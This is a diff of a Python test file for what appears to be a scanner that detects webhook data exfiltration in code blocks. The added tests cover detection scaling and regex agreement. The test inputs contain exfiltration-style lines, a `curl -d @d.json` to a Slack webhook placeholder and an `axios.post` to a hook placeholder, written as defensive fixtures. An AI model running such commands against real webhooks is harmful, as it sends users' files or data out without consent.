@@ -6,6 +6,8 @@ path are the service's. D2: any character that isn't ASCII in the document's cod
 
 Part 2 adds Replays: PR3's Codex round 3 highs 1-7, each WT-T018 on a3e535e. Fix round 1 adds CodexRound1 (imports, HTML code
 regions, statement starts, shell line joins, shell words and loops, repeated sends, a long import line), each failing on a34e390.
+Fix round 2 adds CodexRound2 (blanks before an import line's comment, many shell line joins: each times out on 18c3c56; and both
+new readings checked against fix round 1's regexes).
 Every URL is an example; every webhook is FAKE; `relay` is a placeholder that is never run."""
 import os, subprocess, sys, unittest
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
@@ -221,6 +223,52 @@ class CodexRound1(unittest.TestCase):   # fix round 1: each WT-T018 on a34e390 (
                                " + \"', json=payload)\\n```\\n\"", timeout=30)
         self.assertEqual(got, "['WT-T005']")
         self.assertLess(scan + chat, 20.0)   # chat_webhook runs first and does the reading (a34e390: 23.7 s there)
+
+
+class CodexRound2(unittest.TestCase):   # fix round 2: 1 and 2 time out on 18c3c56 at full size; the small size gives today's result
+    def test_1_blanks_before_an_import_line_comment_scale_linearly(self):
+        build = lambda n: ("HEAD + '```js\\nimport axios from \\'axios\\'' + ' ' * " + str(n) + " + \"/* note */\\naxios.post('\" + HOOK"
+                           " + \"', body)\\n```\\n\"")
+        self.assertEqual(_run(build(2_000))[0], "['WT-T005']")
+        self.assertEqual(_run(build(200_000), timeout=20)[0], "['WT-T005']")
+
+    def test_2_many_shell_line_joins_before_a_curl_scale_linearly(self):
+        build = lambda n: "HEAD + '```bash\\n' + '\\\\\\n' * " + str(n) + " + \"true\\ncurl -d @d.json '\" + SLACK + \"'\\n```\\n\""
+        self.assertEqual(_run(build(1_000))[0], "['WT-T018']")
+        self.assertEqual(_run(build(32_000), timeout=20)[0], "['WT-T018']")
+
+    def test_3_both_readings_agree_with_fix_round_1(self):   # the round-1 regexes, rebuilt here, on a fixed corpus
+        import random, re
+        old_imports = re.compile(
+            r"(?:import[ \t]+" + wt._ALLOWED_MODS + r"(?:[ \t]*,[ \t]*" + wt._ALLOWED_MODS + r")*"
+            r"|from[ \t]+" + wt._FROM_MODS + r"[ \t]+import[ \t]+" + wt._IMPORTED + r"(?:[ \t]*,[ \t]*" + wt._IMPORTED
+            + r")*)(?P<pc>[ \t]+#.*)?"
+            r"|(?:import[ \t]+axios[ \t]+from[ \t]+(?P<q1>['\"])axios(?P=q1)"
+            r"|(?:const|let|var)[ \t]+axios[ \t]*=[ \t]*require\([ \t]*(?P<q2>['\"])axios(?P=q2)[ \t]*\))[ \t]*;?(?P<jc>[ \t]*//.*)?")
+        old_ctrl = re.compile(r"(?m)(?:^|(?<=[;&|(){}`\n]))(?:[ \t!]|\\\r?\n)*(?:"
+                              + "|".join(r"(?:\\\r?\n)*".join(w) for w in ("if", "for", "while", "until", "case", "select", "function"))
+                              + r")(?![\w-])")
+        rnd = random.Random(7)
+        heads = ["import json", "import json , os", "from os import path", "from time import a,b", "import axios from 'axios'",
+                 "const axios = require( \"axios\" )", "let axios=require('axios')", "import axios", "from requests import x",
+                 "import jsonx", "from os import as", "import os,", " import os ", ""]
+        tails = ["", " ", "\t", ";", " ;", "; ", ";;", "  # c", "# c", " #import x", "// c", " // c", " ;// c", "; // require",
+                 " /* c */", " ; ; //", ",", " ,os", "\r", " #", "\x0c", " é"]
+        pieces = ["import", "from", "axios", "json", "os", "as", "require(", ")", "'axios'", " ", "\t", ",", ";", "#", "//", "x", "="]
+        lines = [h + t for h in heads for t in tails] + ["".join(rnd.choice(pieces) for _ in range(rnd.randint(1, 8)))
+                                                         for _ in range(3_000)]
+        for line in lines:
+            m = old_imports.fullmatch(line.strip())
+            old = bool(m) and not wt._IMPORT_WORD.search(m.group("pc") or m.group("jc") or "")
+            self.assertEqual(wt._import_line(line, 0, len(line)), old, repr(line))
+        pieces = ["if", "i", "f", "for", "fi", "while", "function", "case", "select", "until", "do", " ", "\t", "!", "\\\n",
+                  "\\\r\n", "\\", "\n", "\r", ";", "&", "|", "(", ")", "{", "}", "`", "x", "-"]
+        for _ in range(5_000):
+            t = "".join(rnd.choice(pieces) for _ in range(rnd.randint(0, 12)))
+            rs = rnd.randint(0, len(t))
+            re_ = rnd.randint(rs, len(t))
+            m = old_ctrl.search(t, rs, re_)
+            self.assertEqual(wt._shell_ctrl(t, rs, re_), re_ if m is None else m.start(), repr((t, rs, re_)))
 
 
 class UnchangedElsewhere(Folder):
